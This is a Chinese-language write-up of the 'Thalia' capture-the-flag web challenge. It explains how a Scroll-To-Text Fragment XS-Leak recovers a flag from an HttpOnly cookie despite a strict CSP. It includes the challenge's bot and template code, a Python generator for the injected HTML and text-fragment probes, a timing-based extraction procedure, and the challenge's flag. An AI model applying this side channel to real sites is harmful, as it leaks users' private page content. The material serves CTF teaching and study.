# Thalia

## 题目简述

机器人把 flag 放入 HttpOnly、SameSite=Strict Cookie，服务端再把它渲染为页面文本。用户可以注入任意 HTML，但响应 CSP 为 `default-src 'none'`、`connect-src 'none'`、随机 nonce 脚本且 `frame-ancestors 'none'`，传统 XSS 无法读取或外传 Cookie。预期解法是 Scroll-To-Text Fragment（STTF）XS-Leak：用 `#:~:text=候选文本` 让 Chrome 在命中时滚动到秘密，再通过懒加载 iframe 的加载开销或窗口侧信号判断是否命中，逐步恢复 flag。

## 解题过程

### 明确可见秘密与被封锁的直接通道

机器人先访问同源页面并写入 Cookie：

```python
driver.add_cookie({
    'name': 'flag',
    'value': flag,
    'path': '/',
    'httpOnly': True,
    'samesite': 'Strict',
})
```

首页从 Cookie 读取 flag 并放进 DOM：

```html
{% if flag %}
    <div class="xss">{{ flag }}</div>
{% endif %}
{% if xss %}
    <div class="xss">{{ xss | safe }}</div>
{% endif %}
```

nonce 脚本随后把每个 `.xss` 的文字拆成独立 `<span>`，但其可见文本仍连续，Chrome 的文本片段搜索仍能匹配。攻击者注入的普通 `<script>` 没有当前响应的随机 nonce；外连、样式和跨源 frame 也被 CSP 阻止，所以重点应从“执行脚本”转向“观察浏览器是否滚动”。

### 利用 `/bot` 构造带片段的内部 URL

`/bot` 对参数做 Base64 解码后直接拼接：

```python
data = base64.b64decode(request.args['xss']).decode()
url = f"http://127.0.0.1:6969/?xss={data}"
return visit_url(url, flag)
```

URL 的 `#fragment` 不会发送给 Flask，但会由 Chrome 处理。因此 Base64 明文可以由两部分组成：

```text
[URL 编码后的 HTML 注入]#fallback:~:text=[URL 编码后的候选]
```

HTML 注入在页面底部制造很长的空白区、一个懒加载 iframe 阵列和 `id="fallback"` 的普通锚点。若秘密文本匹配，STTF 把视口带到页面顶部的 flag，底部 iframe 保持懒加载；若不匹配，普通 `#fallback` 生效并滚到底部，使大量 iframe 开始加载。也可以反过来摆放阵列，重要的是先用一组必命中和必不命中的探针标定“快/慢”方向。

一个生成探针的骨架如下：

```python
import base64
from urllib.parse import quote

def build_probe(candidate):
    spacer = "<br>" * 3000
    frames = "".join(
        '<iframe loading="lazy" src="/"></iframe>'
        for _ in range(80)
    )
    markup = (
        "</div>" + spacer + frames +
        '<div id="fallback">probe</div><div>'
    )

    data = (
        quote(markup, safe="") +
        "#fallback:~:text=" + quote(candidate, safe="")
    )
    return base64.b64encode(data.encode()).decode()
```

向 `/bot?xss=<Base64>` 发请求并记录整次响应时间。为降低 Chromium 启动、网络和调度噪声，应对每个候选重复多次并取中位数，同时交替发送已知存在的 `shellmates%7B` 与随机不存在字符串作为两类基线。[XS-Leaks 对 STTF 的说明](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/)指出了这里依赖的完整机制：文本片段命中会把内容带入视口，而进入视口的 lazy 资源加载可成为跨站可观察副作用。

### 逐步扩展已知文本

从已知前缀 `shellmates{` 开始，对允许字符集逐个附加候选；把分类结果落在“命中”分布的字符加入前缀，继续下一位，直到 `}`。实际提取时还要遵守目标 Chrome 版本对文本片段的词边界要求，可在下划线等边界处分段，并用 `textStart,textEnd` 或前后文形式消除歧义。

公开仓库的 `solve/README.md` 只给出了 STTF 与 lazy-iframe/window-counting 思路，没有附带可运行的逐字脚本或现场计时记录；当前服务也已不在仓库中。比赛分发包 `Thalia.tar.gz` 的 Compose 文件使用 `shellmates{fake_flag}`，而公开部署目录中的 Dockerfile/Compose 才记录真实值。由该部署证据可核对最终 flag：

```text
shellmates{FRonT_1s_FuN_iNFr4_isS_deAD_SorRy_BND_andd_Sm41l}
```

因此，以上是与源码和官方说明一致的预期恢复链，不应表述成对当前在线实例完成过的端到端计时提取。

## 方法总结

严格 CSP 与 HttpOnly 能阻断传统 XSS，却不能自动消除浏览器行为侧信道。只要秘密被渲染为可搜索文本、攻击者又能注入影响布局或资源加载的标记，STTF 的“命中并滚动”就可能被放大成计时差。利用时必须做基线、重复测量并处理词边界；归档题解还应区分官方意图、公开源码中的部署值和实际运行证据，不能把其中任何两者混为一谈。
